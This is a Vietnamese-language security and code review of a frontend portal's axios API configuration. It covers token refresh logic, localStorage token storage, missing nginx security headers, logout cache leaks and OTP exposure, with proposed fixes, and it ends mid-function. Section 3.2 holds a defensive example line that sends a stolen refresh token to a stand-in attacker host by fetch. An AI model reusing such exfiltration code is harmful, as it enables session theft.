> # ⚠️ TÀI LIỆU THAM CHIẾU — KHÔNG MÔ TẢ REPO NÀY
>
> Đây là đánh giá bảo mật của **NextGig FE Portal** (`api.nextgig.sg`), một dự án
> KHÁC. Mọi đường dẫn trong file (`src/services/config/index.ts`,
> `deploy/nginx/nginx.conf`, `src/routes/RequireAuth.tsx`…) **không tồn tại** trong
> repo The Nam Du Hill.
>
> **Đọc có phê phán:** repo này dùng cookie `HttpOnly` (BE10) chứ không phải
> `localStorage` như tài liệu, nên:
> - 🔴 #2 (token trong localStorage) — repo **đã ở mức "tốt nhất"** mà tài liệu chỉ
>   dám đề xuất cho Đợt 3
> - **CSRF** — tài liệu chỉ nhắc thoáng 2 lần trong ghi chú đánh đổi. Với auth bằng
>   cookie thì CSRF là rủi ro CÓ THẬT, và đây là khoảng trống của tài liệu
> - Tài liệu **không có mục nào** cho mã **409** (overbooking) và **422** (chuyển
>   trạng thái sai) — hai mã cốt lõi của nghiệp vụ đặt phòng
>
> Ba ý đáng học và nên đưa vào `.claude/rules/`: cấm nuốt lỗi trong wrapper fetch ·
> một hàm `logout()` duy nhất có xoá cache · bắt buộc `timeout` cho mọi HTTP client.
>
> Phân tích đầy đủ: [`docs/superpowers/specs/2026-08-08-notes-api-layer-and-drawer-coverage.md`](../../docs/superpowers/specs/2026-08-08-notes-api-layer-and-drawer-coverage.md)

---

# Đánh giá kỹ thuật & An toàn hệ thống — `apiConfig`

> Phạm vi: [`src/services/config/index.ts`](src/services/config/index.ts) và toàn bộ vùng ảnh hưởng của nó — vòng đời token, luồng đăng nhập/đăng xuất, tầng lưu trữ, cấu hình triển khai.
>
> Phương pháp: đọc code, trace mọi call-site của `setToken`/`removeToken`/`localStorage`, đối chiếu với cấu hình nginx và biến môi trường. Mọi kết luận đều kèm dẫn chứng dòng code cụ thể.
>
> ⚠️ **Đây là đánh giá code nội bộ**, không phải kết quả kiểm thử thâm nhập. Các phát hiện cần được xác minh trên môi trường thật trước khi lập kế hoạch xử lý.

---

## Mục lục

1. [Tóm tắt điều hành](#1-tóm-tắt-điều-hành)
2. [Đánh giá kỹ năng xử lý `apiConfig`](#2-đánh-giá-kỹ-năng-xử-lý-apiconfig)
3. [Đánh giá an toàn hệ thống](#3-đánh-giá-an-toàn-hệ-thống)
4. [Bảng tổng hợp phát hiện](#4-bảng-tổng-hợp-phát-hiện)
5. [Lộ trình khắc phục](#5-lộ-trình-khắc-phục)
6. [Phụ lục: code đề xuất](#6-phụ-lục-code-đề-xuất)

---

## 1. Tóm tắt điều hành

| Hạng mục | Kết quả |
|---|---|
| **Kỹ năng xử lý `apiConfig`** | **Khá — Mid+ / cận Senior.** Giải đúng bài toán khó nhất (single-flight refresh); hụt ở tính đầy đủ và type safety. |
| **An toàn hệ thống** | **Trung bình — cần khắc phục.** 3 vấn đề nghiêm trọng, 5 trung bình. Không phát hiện lỗ hổng cho phép chiếm quyền trực tiếp, nhưng bề mặt tấn công XSS rộng hơn mức cần thiết. |

**Điểm mạnh nổi bật.** Cơ chế single-flight refresh ([dòng 98–132](src/services/config/index.ts#L98-L132)) được cài đúng — đây là bài toán race condition thật mà phần lớn dev mid làm sai. Việc dùng hard redirect thay vì `navigate()` sau khi phiên chết là quyết định bảo mật đúng, có chủ ý.

**Rủi ro lớn nhất.** Không phải một lỗ hổng đơn lẻ mà là **tổ hợp**: token trong `localStorage` + không có Content-Security-Policy + `localStorage.clear()` toàn cục + không xoá cache TanStack khi logout. Từng mục riêng lẻ là chấp nhận được; cộng lại thì một lỗ XSS duy nhất ở bất kỳ đâu sẽ dẫn tới chiếm đoạt phiên hoàn toàn và im lặng.

---

## 2. Đánh giá kỹ năng xử lý `apiConfig`

### 2.1 Những gì làm đúng

#### ✅ Single-flight refresh — điểm sáng rõ rệt

```ts
let isRefreshing = false;
let failedQueue: any[] = [];

if (isRefreshing) {
  return new Promise((resolve, reject) => { failedQueue.push({ resolve, reject }); })
    .then((token) => {
      originalRequest.headers.Authorization = `Bearer ${token}`;
      originalRequest._retry = true;
      originalRequest._retryAfterRefresh = true;
      return apiConfig(originalRequest);
    });
}
```

**Bài toán:** màn hình mở đồng thời N request. Token hết hạn → cả N nhận 401 cùng lúc. Nếu mỗi request tự gọi refresh, backend (thường xoay vòng refresh token) sẽ vô hiệu hoá các lần gọi sau → user bị đăng xuất oan dù token còn hợp lệ.

**Lời giải ở đây đúng cả 4 điểm:**

| Yêu cầu | Cách xử lý | Đánh giá |
|---|---|---|
| Chỉ 1 request gọi refresh | Cờ `isRefreshing` | ✅ |
| Các request khác chờ, không fail | Promise queue `failedQueue` | ✅ |
| Sau refresh, replay toàn bộ với token mới | `processQueue(null, newToken)` | ✅ |
| Luôn nhả cờ kể cả khi throw | `finally { isRefreshing = false }` | ✅ |

Riêng `finally` là chi tiết dễ sót nhất: nếu quên, một lần refresh lỗi sẽ khiến **mọi** 401 về sau treo vĩnh viễn trong hàng đợi. Việc dev đặt đúng chỗ cho thấy có tư duy về failure path, không chỉ happy path.

#### ✅ Chống vòng lặp vô hạn bằng hai cờ

```ts
if (originalRequest._retry && originalRequest._retryAfterRefresh) {
  removeToken();
  window.location.replace(APP_ROUTES.HOME.to);
  return Promise.reject(errorCreate(401, SYS_MESS.ERROR.EM1));
}
```

Hai cờ phân biệt "đã thử lại" (`_retry`) với "đã thử lại **sau khi** refresh thành công" (`_retryAfterRefresh`). Nếu token mới vẫn bị 401 → token thực sự chết → dừng, không lặp. Đây là thiết kế đúng; dùng một cờ sẽ để lọt trường hợp lặp.

#### ✅ Hard redirect sau khi phiên chết — quyết định bảo mật đúng

```ts
window.location.replace(APP_ROUTES.HOME.to);
```

Dùng `window.location.replace` thay vì `navigate()` **huỷ toàn bộ JS context**: zustand store, TanStack Query cache, drawer stack, mọi closure đang giữ dữ liệu. Sau khi phiên chết, giữ lại bất kỳ in-memory state nào cũng là rủi ro rò rỉ dữ liệu giữa hai tài khoản trên cùng máy.

Dùng `replace` (không phải `assign`) để user không Back được về trang đã đăng xuất.

#### ✅ Refresh dùng axios "sạch"

```ts
await axios.post(`${import.meta.env.VITE_URL_API}/auth/refresh-access-token`, { refreshToken });
```

Gọi `axios` gốc chứ không phải `apiConfig`. Đúng — nếu dùng `apiConfig`, request refresh sẽ đi qua chính interceptor 401 và tạo đệ quy vô hạn khi refresh token cũng hết hạn. Nhiều triển khai mắc lỗi này.

#### ✅ Chuẩn hoá lỗi tập trung

```ts
const errorCreate = (_code: number, message: string): INormalError =>
  ({ status: _code, message, success: false, error: message });
```

Mọi status được ánh xạ về một hình dạng `INormalError` duy nhất. Tầng trên chỉ cần biết một contract. Đây là ranh giới chống ăn mòn hợp lý.

#### ✅ Truyền thông báo qua `localStorage` khi redirect cứng

```ts
localStorage.setItem('errorToast', SYS_MESS.ERROR.EM1);
window.location.replace(APP_ROUTES.HOME.to);
```

Vì `window.location.replace` huỷ React tree, `toast.error()` không kịp render. Ghi vào storage rồi để [`login/index.tsx:39-42`](src/modules/auth/login/index.tsx#L39-L42) đọc và hiển thị sau khi mount là giải pháp hợp lệ cho tình huống này — và dev có nhớ `removeItem` sau khi đọc, không để rác lại.

---

### 2.2 Những gì còn thiếu

#### ⚠️ Không có timeout — request có thể treo vô hạn

```ts
const apiConfig = axios.create({
  baseURL: import.meta.env.VITE_URL_API,
  headers: { 'Content-Type': 'application/json' },
  // ❌ thiếu timeout
});
```

Axios mặc định `timeout: 0` = **không giới hạn**. Kết hợp với `retry: false` của TanStack Query, một request treo sẽ để spinner quay mãi không có lối thoát. Trên mạng di động chập chờn — đúng đối tượng người dùng chính của portal này — đây là lỗi UX gặp thường xuyên.

#### ⚠️ Không xử lý lỗi mạng / request bị huỷ

```ts
} else {
  return Promise.reject(errorCreate(400, ''));   // ❌ message rỗng
}
```

Nhánh `else` gom tất cả: mất mạng, DNS lỗi, CORS bị chặn, timeout, request bị `AbortController` huỷ. Tất cả biến thành `status 400, message ''`. Hệ quả:

- `formatRejectError` trả chuỗi rỗng → `toast.error('')` → **toast trống hiện lên**, user không hiểu gì.
- Không phân biệt được "server từ chối" với "không có mạng" → không thể hiển thị thông báo phù hợp hoặc gợi ý thử lại.
- Request bị huỷ (do đổi filter nhanh) cũng bị coi là lỗi → toast rác.

Thiếu ba nhánh: `!error.response` (lỗi mạng), `axios.isCancel(error)` (bị huỷ), `error.code === 'ECONNABORTED'` (timeout).

#### ⚠️ Response interceptor nói dối về kiểu dữ liệu

```ts
apiConfig.interceptors.response.use(function (response) {
  return response.data;   // trả về body, nhưng axios khai báo trả AxiosResponse
});
```

TypeScript vẫn tin rằng `apiConfig.get()` trả `Promise<AxiosResponse<T>>`, trong khi runtime trả `T`. Toàn bộ type safety ở tầng service phụ thuộc vào việc dev **nhớ** khai báo tay kiểu trả về trên từng method:

```ts
getJobList: (params: IQueryString): Promise<IResponse<EJobResponse>> => apiConfig.get(…)
//                                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ khai báo tay, không được compiler kiểm chứng
```

Quên khai báo → kiểu sai âm thầm, không có lỗi biên dịch. Cách chuẩn là dùng module augmentation của axios để khai báo lại `AxiosInstance`.

#### ⚠️ `let` module-level là singleton ẩn

```ts
let isRefreshing = false;
let failedQueue: any[] = [];
```

Chạy đúng với SPA một tab. Nhưng:

- **Không test được** — không có cách reset state giữa các test case.
- **Không đồng bộ giữa các tab** — mở 3 tab portal, mỗi tab refresh riêng. Nếu backend xoay vòng refresh token, tab 2 và 3 sẽ bị đăng xuất. Đây là bug thật, người dùng gặp được. Giải pháp: `BroadcastChannel` hoặc `localStorage` event để đồng bộ giữa tab.

#### ⚠️ `console.log` rò rỉ chi tiết lỗi

```ts
catch (error) {
  console.log('Failed to refresh token', error);   // ❌ in ra production
  return null;
}
```

`console.log` chạy trong bản build production. Object `error` của axios chứa `config.headers` — **bao gồm cả header `Authorization` với token**. Bất kỳ ai mở DevTools (hoặc bất kỳ script nào hook `console.log`) đều đọc được. Đây vừa là vấn đề vệ sinh code vừa là rò rỉ thông tin.

Tương tự ở [`RequireAuth.tsx:20`](src/routes/RequireAuth.tsx#L20), [`RequirePermission.tsx:28`](src/routes/RequirePermission.tsx#L28), [`RequireAnonymous.tsx:10`](src/routes/RequireAnonymous.tsx#L10).

#### ⚠️ `any` ở đúng chỗ nhạy cảm

```ts
let failedQueue: any[] = [];
const processQueue = (error: any, token: string | null = null) => { … };
```

Kiểu đúng là `Array<{ resolve: (t: string) => void; reject: (e: unknown) => void }>`. Ở đoạn code phức tạp nhất file, `any` che mất chính chỗ cần compiler hỗ trợ nhất.

---

### 2.3 Kết luận về kỹ năng

**Mid+ / cận Senior, trong phạm vi file này.**

| Tiêu chí | Điểm | Nhận xét |
|---|---|---|
| Tư duy race condition | ★★★★★ | Single-flight + queue + `finally` — chuẩn |
| Hiểu vòng đời auth | ★★★★☆ | Hai cờ chống lặp, refresh dùng axios sạch |
| Ý thức bảo mật | ★★★☆☆ | Hard redirect đúng; nhưng thiếu CSP, log token |
| Độ đầy đủ (edge case) | ★★☆☆☆ | Thiếu timeout, lỗi mạng, request bị huỷ |
| Type safety | ★★☆☆☆ | `any` ở vùng lõi, interceptor nói dối kiểu |
| Khả năng test | ★☆☆☆☆ | State module-level, không có test nào |

**Diễn giải.** Dev **có tư duy hệ thống** — nhận ra được race condition trong refresh flow và giải đúng, đó là tín hiệu mạnh vượt trên mức trung bình. Điều ngăn cách với Senior không phải là năng lực giải quyết vấn đề, mà là **tính đầy đủ**: xử lý được đường đi chính và một failure path khó, nhưng bỏ sót các failure path thường gặp hơn (mất mạng, timeout, đa tab). Đây là khoảng cách điển hình giữa "code chạy đúng trong điều kiện bình thường" và "code chịu được điều kiện xấu" — và thường được rút ngắn bằng việc viết test cho chính module này.

---

## 3. Đánh giá an toàn hệ thống

### 3.1 [NGHIÊM TRỌNG] Thiếu Content-Security-Policy và các security header

**Dẫn chứng:** [`deploy/nginx/nginx.conf`](deploy/nginx/nginx.conf) — toàn bộ file:

```nginx
server {
  server_name localhost;
  listen 8080;
  location / {
      root   /usr/share/nginx/html;
      index  index.html;
      try_files $uri $uri/ /index.html;
  }
  error_page   500 502 503 504 404  /index.html;
}
```

**Không có bất kỳ security header nào.** Thiếu:

| Header | Tác dụng | Hậu quả khi thiếu |
|---|---|---|
| `Content-Security-Policy` | Chặn script lạ thực thi | XSS không bị hạn chế; script chèn vào đọc được `localStorage` |
| `X-Frame-Options` / `frame-ancestors` | Chặn nhúng iframe | **Clickjacking** — nhúng portal vào trang giả, lừa click nút Delete/Approve |
| `X-Content-Type-Options: nosniff` | Chặn MIME sniffing | Trình duyệt đoán sai kiểu file → thực thi nội dung upload |
| `Referrer-Policy` | Giới hạn thông tin referrer | URL chứa `?filter[company]=<id>` bị gửi sang bên thứ ba |
| `Strict-Transport-Security` | Ép HTTPS | Hạ cấp về HTTP, tấn công MITM |

**Vì sao đây là mục nghiêm trọng nhất:** CSP là lớp phòng thủ chiều sâu chính chống lại XSS. Không có nó, mọi rủi ro XSS khác trong tài liệu này đều nhân lên nhiều lần.

**Khắc phục:** xem [§6.1](#61-nginx--security-header).

---

### 3.2 [NGHIÊM TRỌNG] Token trong `localStorage` — bề mặt XSS

**Dẫn chứng:** [`services/config/index.ts:44`](src/services/config/index.ts#L44), [`hooks/query/auth/index.ts:35-36`](src/hooks/query/auth/index.ts#L35-L36)

```ts
localStorage.setItem(ACCESS_TOKEN,  res.data.tokens[EAuth.accessToken]);
localStorage.setItem(REFRESH_TOKEN, res.data.tokens[EAuth.refreshToken]);
```

`localStorage` đọc được bởi **mọi** JavaScript chạy trên origin. Một lỗ XSS ở bất kỳ đâu — kể cả trong dependency bên thứ ba — đều có thể đọc và gửi token đi:

```js
fetch('https://attacker.example/', {
  method: 'POST',
  body: localStorage.getItem('REFRESH_TOKEN_WEB_EMPLOYER'),
});
```

**Điểm làm vấn đề nặng hơn:** **refresh token** cũng nằm trong `localStorage`. Access token thường sống ngắn (15–60 phút), nhưng refresh token sống dài (nhiều ngày/tuần). Chiếm được refresh token = duy trì quyền truy cập lâu dài, và đổi mật khẩu chưa chắc thu hồi được nếu backend không xử lý.

**Bối cảnh đánh giá.** Đây là đánh đổi rất phổ biến — phần lớn SPA đều làm vậy vì httpOnly cookie yêu cầu backend hỗ trợ và xử lý CSRF. Nó **không** phải lỗi của riêng dev này. Nhưng cần ghi nhận đúng mức độ rủi ro, đặc biệt khi kết hợp với việc thiếu CSP (§3.1).

**Khắc phục theo mức độ đầu tư:**

| Mức | Giải pháp | Đánh đổi |
|---|---|---|
| **Tốt nhất** | Refresh token trong httpOnly + Secure + SameSite cookie; access token giữ trong memory | Cần backend đổi; phải xử lý CSRF |
| **Trung gian** | Access token trong memory (biến JS), chỉ refresh token trong storage | Giảm bề mặt lộ access token; F5 phải refresh lại |
| **Tối thiểu** | Giữ nguyên nhưng **bắt buộc** có CSP chặt (§3.1) | Không giảm rủi ro gốc, chỉ giảm xác suất XSS |

---

### 3.3 [NGHIÊM TRỌNG] `localStorage.clear()` xoá vượt phạm vi

**Dẫn chứng:** [`services/config/index.ts:18-21`](src/services/config/index.ts#L18-L21)

```ts
export const removeToken = () => {
  localStorageService.clear();   // ❌ xoá TOÀN BỘ localStorage của origin
  delete apiConfig.defaults.headers.common['Authorization'];
};
```

`localStorage.clear()` xoá **mọi** key trên origin, không chỉ token. Bao gồm:

- `global-store` — zustand persist (profile, role, `openMobile`)
- `filters-store` — filter đã lưu
- Bất kỳ key nào do thư viện bên thứ ba hoặc tính năng tương lai ghi vào

**Rủi ro cụ thể — race condition với `errorToast`:**

```ts
removeToken();                                            // ① clear() xoá sạch
localStorage.setItem('errorToast', SYS_MESS.ERROR.EM1);   // ② ghi lại ngay sau
```

Thứ tự hiện tại tình cờ đúng (ghi sau khi xoá). Nhưng nếu ai đó refactor đảo hai dòng này — một thay đổi trông vô hại — thông báo lỗi sẽ bị nuốt và user bị đăng xuất **không có lý do nào hiển thị**. Đây là loại bug rất khó truy vết.

**Khắc phục:** xoá có chọn lọc.

```ts
export const removeToken = () => {
  [ACCESS_TOKEN, REFRESH_TOKEN].forEach((k) => localStorage.removeItem(k));
  useGlobal.persist.clearStorage();     // zustand có API riêng
  useFilters.persist.clearStorage();
  delete apiConfig.defaults.headers.common['Authorization'];
};
```

---

### 3.4 [TRUNG BÌNH] Logout không xoá cache TanStack Query — rò rỉ dữ liệu giữa tài khoản

**Dẫn chứng:** [`components/layout/master/constant.tsx:173-177`](src/components/layout/master/constant.tsx#L173-L177)

```ts
const onLogout = () => {
  removeToken();
  hide();          // đóng drawer
  navigate('/');   // ❌ SPA navigation — KHÔNG huỷ JS context
};
```

So sánh với đường 401 trong interceptor:

| Đường thoát | Cơ chế | Cache có bị xoá? |
|---|---|---|
| 401 trong interceptor | `window.location.replace()` | ✅ Có — huỷ toàn bộ JS context |
| **Logout thủ công** | `navigate('/')` | ❌ **Không** — cache còn nguyên |
| `RequirePermission` từ chối | `navigate('/')` ([dòng 40](src/routes/RequirePermission.tsx#L40)) | ❌ **Không** |

**Kịch bản khai thác:** User A dùng máy chung → bấm Logout → User B đăng nhập trên cùng tab. TanStack Query cache vẫn giữ dữ liệu của A (danh sách job, hồ sơ ứng viên, thông tin công ty). Trong khoảng thời gian giữa lúc component mount và lúc refetch xong, **B nhìn thấy dữ liệu của A**.

Mức độ nghiêm trọng phụ thuộc dữ liệu: portal này chứa hồ sơ ứng viên (PII) và thông tin credit — nên đây không phải rủi ro lý thuyết.

**Khắc phục:**

```ts
const onLogout = () => {
  removeToken();
  queryClient.clear();               // xoá toàn bộ cache
  hide();
  window.location.replace('/');      // đồng nhất với đường 401
};
```

Nên đóng gói thành **một** hàm `logout()` dùng chung cho cả ba đường thoát, thay vì lặp lại logic ở ba nơi với ba hành vi khác nhau.

---

### 3.5 [TRUNG BÌNH] OTP trả về client ở môi trường non-production

**Dẫn chứng:** [`hooks/query/auth/index.ts:47-52`](src/hooks/query/auth/index.ts#L47-L52)

```ts
const otp = envMode === EEnvironment.PRODUCTION ? undefined : res?.data?.otp;
navigate(`${APP_ROUTES.VERIFY.to}?${QueryString.stringify({ email, otp })}`);
```

Backend **trả OTP trong response** ở môi trường dev/staging, FE đưa vào URL query string.

**Đánh giá công bằng:** đây là tiện ích test hợp lý và đã có gate theo môi trường. Nhưng có ba rủi ro cần ghi nhận:

1. **Gate nằm ở FE, không ở BE.** Nếu backend vẫn trả `otp` trong production response, chỉ cần mở DevTools Network là đọc được — biến `envMode` ở client không ngăn được gì. **Cần xác minh phía backend.**
2. **OTP trong URL** bị ghi vào lịch sử trình duyệt, log server, header `Referer`.
3. `envMode` đọc từ `VITE_ENV` — build sai mode là lộ ngay, không có cảnh báo.

**Khắc phục:** xác nhận backend không trả `otp` khi ở production; chuyển OTP sang `navigate(..., { state })` thay vì query string.

---

### 3.6 [TRUNG BÌNH] Không đồng bộ refresh giữa nhiều tab

**Dẫn chứng:** [`services/config/index.ts:29-30`](src/services/config/index.ts#L29-L30) — `isRefreshing` và `failedQueue` là biến module-level, phạm vi **một tab**.

**Kịch bản:** user mở portal ở 3 tab. Token hết hạn → cả 3 tab đồng thời gọi `/auth/refresh-access-token` với **cùng** refresh token. Nếu backend áp dụng refresh token rotation (thực hành bảo mật chuẩn), chỉ tab đầu thành công; hai tab còn lại nhận lỗi → `removeToken()` → đăng xuất.

Tệ hơn: `removeToken()` gọi `localStorage.clear()`, mà `localStorage` **dùng chung giữa các tab** → tab 2 xoá token vừa được tab 1 làm mới → tab 1 cũng chết theo.

**Khắc phục:** dùng `BroadcastChannel` để chỉ một tab thực hiện refresh, các tab khác chờ và nhận token mới.

---

### 3.7 [TRUNG BÌNH] 403 ghi `errorToast` nhưng không redirect — thông báo lạc chỗ

**Dẫn chứng:** [`services/config/index.ts:133-135`](src/services/config/index.ts#L133-L135)

```ts
} else if (status === 403) {
  localStorage.setItem('errorToast', SYS_MESS.ERROR.EM1);   // ❌ ghi nhưng không redirect
  return Promise.reject(errorCreate(403, defaultMessage || ''));
}
```

Khác với nhánh 401, ở đây **không** có `window.location.replace()`. Nên `errorToast` nằm lại trong storage và chỉ được đọc khi user tình cờ vào màn login lần sau — có thể là nhiều ngày sau, hiển thị một thông báo hoàn toàn lạc ngữ cảnh.

Đồng thời `EM1` là thông báo phiên hết hạn, không phù hợp với ngữ nghĩa 403 (không đủ quyền).

**Khắc phục:** bỏ dòng `setItem`, để `formatRejectError` hiển thị `defaultMessage` từ backend qua toast bình thường.

---

### 3.8 [TRUNG BÌNH] Không có timeout — hỗ trợ tấn công slowloris phía client

**Dẫn chứng:** [`services/config/index.ts:7-12`](src/services/config/index.ts#L7-L12) — không khai báo `timeout`.

Ngoài vấn đề UX đã nêu ở §2.2, đây còn là vấn đề độ bền: một endpoint bị chậm/treo sẽ khiến connection pool của trình duyệt (6 kết nối/host) cạn kiệt, làm **toàn bộ** ứng dụng đứng, không chỉ màn hình đang lỗi.

**Khắc phục:** `timeout: 30000` cho request thường; endpoint upload/report cấu hình riêng.

---

### 3.9 [THẤP] `@ts-nocheck` trong `localStorageService`

**Dẫn chứng:** [`src/lib/localStorage.ts:1`](src/lib/localStorage.ts#L1)

```ts
// @ts-nocheck
export class localStorageService {
  static getItem(key: string): string {
    return localStorage.getItem(key);   // thực tế trả string | null
  }
}
```

`@ts-nocheck` được dùng để che một lỗi type thật: `localStorage.getItem` trả `string | null`, nhưng khai báo là `string`. Hệ quả là mọi call-site tin rằng luôn có giá trị:

```ts
const refreshToken = localStorageService.getItem(REFRESH_TOKEN);
if (!refreshToken) return null;    // may mắn là chỗ này có kiểm tra
```

Chỗ này có kiểm tra nên an toàn — nhưng đó là nhờ dev cẩn thận, không phải nhờ compiler. Chỗ khác quên kiểm tra sẽ không có cảnh báo nào.

**Khắc phục:** bỏ `@ts-nocheck`, sửa kiểu trả về thành `string | null`, xử lý các lỗi biên dịch phát sinh.

---

### 3.10 [THẤP] `localStorage` không xử lý ngoại lệ

`localStorage.setItem` throw khi ở Safari private mode hoặc khi vượt quota. Toàn bộ code hiện gọi trực tiếp không có `try/catch` — một exception ở đây sẽ làm hỏng luồng đăng nhập với lỗi không rõ ràng.

---

### 3.11 Những gì KHÔNG phải vấn đề

Để tránh cảnh báo sai, các mục sau đã kiểm tra và **đạt**:

| Hạng mục | Kết quả |
|---|---|
| Secret hardcode trong source | ✅ Không có. `.env.*` chỉ chứa URL API và OneLink ID công khai. |
| `dangerouslySetInnerHTML` | ✅ Không sử dụng ở đâu trong `src`. |
| `eval` / `new Function` | ✅ Không có. |
| Encode search param | ✅ Có, ở request interceptor. |
| Refresh dùng axios sạch (chống đệ quy) | ✅ Đúng. |
| Upload S3/Blob | ✅ [`media/index.ts`](src/services/media/index.ts) dùng axios riêng, **không** gửi kèm `Authorization` tới host bên thứ ba — đúng. |
| Token key có namespace | ✅ `ACCESS_TOKEN_WEB_EMPLOYER` — tránh xung đột với app khác cùng domain. |
| `createJobLink` | ✅ Dùng `URLSearchParams`, tự encode; chỉ nhận `jobId`, không nội suy dữ liệu người dùng. |

---

## 4. Bảng tổng hợp phát hiện

| # | Phát hiện | Mức | Vị trí | Loại |
|---|---|---|---|---|
| 1 | Thiếu CSP + security header ở nginx | 🔴 Nghiêm trọng | [`nginx.conf`](deploy/nginx/nginx.conf) | Hạ tầng |
| 2 | Access + refresh token trong `localStorage` | 🔴 Nghiêm trọng | [`auth/index.ts:35-36`](src/hooks/query/auth/index.ts#L35-L36) | Thiết kế |
| 3 | `localStorage.clear()` xoá vượt phạm vi | 🔴 Nghiêm trọng | [`config/index.ts:19`](src/services/config/index.ts#L19) | Logic |
| 4 | Logout không xoá cache TanStack Query | 🟠 Trung bình | [`master/constant.tsx:173`](src/components/layout/master/constant.tsx#L173) | Rò rỉ dữ liệu |
| 5 | OTP trả về client ở non-production | 🟠 Trung bình | [`auth/index.ts:47-52`](src/hooks/query/auth/index.ts#L47-L52) | Thiết kế |
| 6 | Không đồng bộ refresh giữa nhiều tab | 🟠 Trung bình | [`config/index.ts:29-30`](src/services/config/index.ts#L29-L30) | Logic |
| 7 | 403 ghi `errorToast` nhưng không redirect | 🟠 Trung bình | [`config/index.ts:134`](src/services/config/index.ts#L134) | Logic |
| 8 | Không có `timeout` | 🟠 Trung bình | [`config/index.ts:7-12`](src/services/config/index.ts#L7-L12) | Độ bền |
| 9 | `console.log` in cả object lỗi chứa token | 🟡 Thấp | [`config/index.ts:61`](src/services/config/index.ts#L61) | Rò rỉ thông tin |
| 10 | Không xử lý lỗi mạng / request bị huỷ | 🟡 Thấp | [`config/index.ts:142-144`](src/services/config/index.ts#L142-L144) | UX / Độ bền |
| 11 | `@ts-nocheck` trong `localStorageService` | 🟡 Thấp | [`lib/localStorage.ts:1`](src/lib/localStorage.ts#L1) | Type safety |
| 12 | `localStorage` không xử lý ngoại lệ | 🟡 Thấp | [`lib/localStorage.ts`](src/lib/localStorage.ts) | Độ bền |
| 13 | `any` trong `failedQueue` / `processQueue` | 🟡 Thấp | [`config/index.ts:30-32`](src/services/config/index.ts#L30-L32) | Type safety |
| 14 | Interceptor không khớp kiểu khai báo của axios | 🟡 Thấp | [`config/index.ts:81-83`](src/services/config/index.ts#L81-L83) | Type safety |

**Tổng: 3 nghiêm trọng · 5 trung bình · 6 thấp.**

---

## 5. Lộ trình khắc phục

Xếp theo **tỉ lệ giảm rủi ro / công sức**.

### Đợt 1 — Chi phí thấp, hiệu quả cao (nửa ngày)

| Việc | Phát hiện |
|---|---|
| Thêm security header vào `nginx.conf` | #1 |
| Thêm `timeout: 30000` vào `axios.create` | #8 |
| Đổi `localStorage.clear()` → xoá key có chọn lọc | #3 |
| Xoá mọi `console.log` (interceptor + 3 route guard) | #9 |
| Bỏ `setItem('errorToast')` ở nhánh 403 | #7 |

### Đợt 2 — Trung bình (1–2 ngày)

| Việc | Phát hiện |
|---|---|
| Gộp 3 đường logout thành một hàm `logout()` dùng chung, có `queryClient.clear()` + hard redirect | #4 |
| Thêm nhánh xử lý lỗi mạng / timeout / request bị huỷ | #10 |
| Bỏ `@ts-nocheck`, sửa kiểu `localStorageService`, thêm `try/catch` | #11, #12 |
| Đặt kiểu đúng cho `failedQueue` / `processQueue` | #13 |
| Xác minh backend **không** trả `otp` ở production; chuyển OTP sang route state | #5 |

### Đợt 3 — Cần phối hợp / đầu tư (1–2 tuần)

| Việc | Phát hiện |
|---|---|
| Đồng bộ refresh giữa các tab bằng `BroadcastChannel` | #6 |
| Module augmentation cho axios để interceptor khớp kiểu | #14 |
| **Chuyển refresh token sang httpOnly cookie** (cần backend) | #2 |
| Viết test cho single-flight refresh và luồng logout | — |

---

## 6. Phụ lục: code đề xuất

### 6.1 nginx — security header

```nginx
server {
  server_name localhost;
  listen 8080;

  # ─── Security headers ───────────────────────────────────────────
  add_header X-Frame-Options            "DENY"                     always;
  add_header X-Content-Type-Options     "nosniff"                  always;
  add_header Referrer-Policy            "strict-origin-when-cross-origin" always;
  add_header Permissions-Policy         "geolocation=(), microphone=(), camera=()" always;
  add_header Strict-Transport-Security  "max-age=31536000; includeSubDomains" always;

  # CSP — điều chỉnh theo domain thật trước khi bật ở production.
  # Lưu ý: 'unsafe-inline' cho style là do Tailwind/Radix inject style động.
  # Bắt đầu bằng Content-Security-Policy-Report-Only để đo tác động.
  add_header Content-Security-Policy "\
default-src 'self'; \
script-src 'self'; \
style-src 'self' 'unsafe-inline'; \
img-src 'self' data: blob: https:; \
font-src 'self' data:; \
connect-src 'self' https://api.nextgig.sg https://*.blob.core.windows.net; \
frame-ancestors 'none'; \
base-uri 'self'; \
form-action 'self'; \
object-src 'none'" always;

  location / {
      root   /usr/share/nginx/html;
      index  index.html;
      try_files $uri $uri/ /index.html;
  }

  error_page 500 502 503 504 404 /index.html;
}
```

> Trước khi bật CSP ở production: deploy bằng `Content-Security-Policy-Report-Only` trước, theo dõi vi phạm trong console, rồi mới chuyển sang chế độ ép buộc. Danh sách `connect-src` phải khớp domain thật của từng môi trường.

### 6.2 `apiConfig` — timeout và xử lý lỗi đầy đủ

```ts
const apiConfig = axios.create({
  baseURL: import.meta.env.VITE_URL_API,
  timeout: 30_000,
  headers: { 'Content-Type': 'application/json' },
});
```

```ts
// Trong error handler, ĐẶT TRƯỚC các nhánh kiểm tra status:
if (axios.isCancel(error)) {
  return Promise.reject(errorCreate(0, ''));      // request bị huỷ — không hiện toast
}
if (error.code === 'ECONNABORTED') {
  return Promise.reject(errorCreate(408, SYS_MESS.ERROR.TIMEOUT));
}
if (!error.response) {
  return Promise.reject(errorCreate(0, SYS_MESS.ERROR.NETWORK));
}
```

Bổ sung vào `SYS_MESS.ERROR`:

```ts
NETWORK: 'Không có kết nối mạng. Vui lòng kiểm tra đường truyền.',
TIMEOUT: 'Yêu cầu quá thời gian chờ. Vui lòng thử lại.',
```

### 6.3 `removeToken` — xoá có chọn lọc

```ts
import { useGlobal } from '@/stores/global';
import { useFilters } from '@/stores/filters';

export const removeToken = () => {
  [ACCESS_TOKEN, REFRESH_TOKEN].forEach((key) => {
    try { localStorage.removeItem(key); } catch { /* Safari private mode */ }
  });
  useGlobal.persist.clearStorage();
  useFilters.persist.clearStorage();
  delete apiConfig.defaults.headers.common['Authorization'];
  window.dispatchEvent(new Event('local-storage'));
};
```

### 6.4 Hàm `logout()` dùng chung

```ts
// src/lib/auth.ts
import { removeToken } from '@/services/config';
import { APP_ROUTES } from '@/routes/routes';
import type { QueryClient } from '@tanstack/react-query';

export const logout = (queryClient: QueryClient, message?: string) => {
  removeToken();
  queryClient.clear();                                  // xoá cache — chống rò rỉ giữa tài khoản
  if (message) localStorage.setItem('errorToast', message);
